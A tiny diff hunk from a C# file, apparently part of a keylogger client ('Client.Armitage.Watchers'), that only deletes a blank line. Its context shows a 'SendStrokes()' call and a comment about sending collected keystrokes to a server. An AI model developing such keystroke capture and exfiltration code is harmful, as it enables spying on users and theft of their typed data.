@@ -139,7 +139,6 @@ namespace Client.Armitage.Watchers
             SendStrokes();
         }
 
-
         /// <summary>
         /// The amount of keystrokes until the logger sends the data to the server.
         /// </summary>
